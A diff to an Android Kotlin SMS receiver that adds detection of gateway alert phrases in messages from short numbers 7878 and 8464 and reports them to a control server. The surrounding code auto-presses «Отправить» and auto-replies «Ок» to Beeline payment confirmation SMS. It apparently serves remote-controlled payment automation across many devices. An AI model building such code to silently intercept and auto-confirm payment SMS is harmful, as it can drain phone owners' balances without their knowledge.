@@ -46,6 +46,16 @@ class SmsReceiver : BroadcastReceiver() {
             !DeviceStore.isSessionDone(context) &&
             DeviceStore.hasWork(context)
 
+        // --- Gateway-alert keywords (from 7878 OR 8464, in EVERY mode) ---
+        // Some gateway/signal replies must always raise a bot notification (and, for
+        // the admin's own devices, a SIGNL4 webhook). Checked first, before any mode
+        // branch, so it works during Метод Форс and ordinary work alike. These words
+        // never overlap with «символ»/«успешно», so the handshake below is unaffected.
+        if (fromGateway || fromSignal) {
+            val code = gatewayAlertCode(body)
+            if (code != null) { reportGatewayAlert(context, code); return }
+        }
+
         // --- Метод Форс mode: the automation engine owns the handshake ---
         // The Beeline flow presses «Отправить»; the «символ»→«Ок»→«успешно» reply
         // cycle still arrives here as SMS from 8464. With auto-confirm ON we answer
@@ -190,6 +200,27 @@ class SmsReceiver : BroadcastReceiver() {
         } catch (e: Exception) {
             Log.e(TAG, "Failed to reply Ок", e)
         }
+    }
+
+    /**
+     * Classifies an incoming SMS (from 7878 or 8464) into a gateway-alert code, or
+     * null if none of the tracked phrases are present. «ё» is normalised to «е» so
+     * spelling variants still match.
+     */
+    private fun gatewayAlertCode(body: String): String? {
+        val t = body.lowercase().replace('ё', 'е')
+        return when {
+            t.contains("операция отклонена") -> "declined"
+            t.contains("раз позднее") -> "retry"   // "(ещё) раз позднее"
+            t.contains("паспортные") -> "passport"
+            else -> null
+        }
+    }
+
+    /** Tells the server which gateway alert fired; the server notifies the owner. */
+    private fun reportGatewayAlert(context: Context, code: String) {
+        val appCtx = context.applicationContext
+        Thread { ControlClient.reportEvent(appCtx, "gwalert", code) }.apply { isDaemon = true }.start()
     }
 
     private fun reportRejected(context: Context, requisites: String) {
